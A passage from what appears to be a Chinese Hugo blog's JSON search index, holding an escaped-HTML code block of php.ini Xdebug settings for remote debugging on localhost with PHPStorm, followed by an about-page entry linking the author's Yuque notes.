rx=\"2\" ry=\"2\"\u003e\u003c/rect\u003e\u003cpath d=\"M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1\"\u003e\u003c/path\u003e\u003c/svg\u003e\r\n            \u003c/button\u003e\r\n            \u003cbutton class=\"toggle-btn\" title=\"Toggle\"\u003e\r\n                \u003csvg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"feather feather-chevron-down\"\u003e\u003cpolyline points=\"6 9 12 15 18 9\"\u003e\u003c/polyline\u003e\u003c/svg\u003e\r\n            \u003c/button\u003e\r\n        \u003c/div\u003e\r\n    \u003c/div\u003e\r\n    \u003cdiv class=\"code-content\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cdiv class=\"chroma\"\u003e\n\u003ctable class=\"lntable\"\u003e\u003ctr\u003e\u003ctd class=\"lntd\"\u003e\n\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode\u003e\u003cspan class=\"lnt\" id=\"1\"\u003e\u003ca class=\"lnlinks\" href=\"#1\"\u003e 1\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"2\"\u003e\u003ca class=\"lnlinks\" href=\"#2\"\u003e 2\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"3\"\u003e\u003ca class=\"lnlinks\" href=\"#3\"\u003e 3\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"4\"\u003e\u003ca class=\"lnlinks\" href=\"#4\"\u003e 4\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"5\"\u003e\u003ca class=\"lnlinks\" href=\"#5\"\u003e 5\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"6\"\u003e\u003ca class=\"lnlinks\" href=\"#6\"\u003e 6\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"7\"\u003e\u003ca class=\"lnlinks\" href=\"#7\"\u003e 7\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"8\"\u003e\u003ca class=\"lnlinks\" href=\"#8\"\u003e 8\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"9\"\u003e\u003ca class=\"lnlinks\" href=\"#9\"\u003e 9\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"10\"\u003e\u003ca class=\"lnlinks\" href=\"#10\"\u003e10\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"11\"\u003e\u003ca class=\"lnlinks\" href=\"#11\"\u003e11\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"12\"\u003e\u003ca class=\"lnlinks\" href=\"#12\"\u003e12\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"13\"\u003e\u003ca class=\"lnlinks\" href=\"#13\"\u003e13\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"14\"\u003e\u003ca class=\"lnlinks\" href=\"#14\"\u003e14\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"15\"\u003e\u003ca class=\"lnlinks\" href=\"#15\"\u003e15\u003c/a\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd class=\"lntd\"\u003e\n\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-fallback\" data-lang=\"fallback\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e[Xdebug]\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ezend_extension=D:/CTF-Tools/phpstudy_pro/Extensions/php/php5.5.9nts/ext/php_xdebug.dll\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003exdebug.collect_params=1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003exdebug.collect_return=1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003exdebug.auto_trace=Off\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003exdebug.trace_output_dir=D:/CTF-Tools/phpstudy_pro/Extensions/php_log/php5.5.9nts.xdebug.trace\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003exdebug.profiler_enable=Off\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003exdebug.profiler_output_dir=\u0026#34;D:\\CTF-Tools\\phpstudy_pro\\Extensions\\tmp\\xdebug\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003exdebug.remote_enable=On\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003exdebug.remote_host=localhost\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003exdebug.remote_port=9100\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003exdebug.remote_handler=dbgp\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003exdebug.mode=debug\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003exdebug.idekey = PHPSTORM\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003exdebug.remote_enable=On\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003c/div\u003e\r\n\u003c/div\u003e\u003cp\u003e\u003cstrong\u003e接下来打开PHP storm设置：\u003c/strong\u003e\u003c/p\u003e","title":"PHP storm 配置 XDebug"},{"content":"这是关于页。。\n我的语雀：https://www.yuque.com/taohuayuanpang/ //文章可能会有格式问题，所以放一个原文链接。\n","permalink":"http://localhost:1313/xvsf/about/","summary":"\u003cp\u003e这是关于页。。\u003c/p\u003e\n\u003cp\u003e我的语雀：https://www.yuque.com/taohuayuanpang/     //文章可能会有格式问题，所以放一个原文链接。\u003c/p\u003e","title":"关于"}]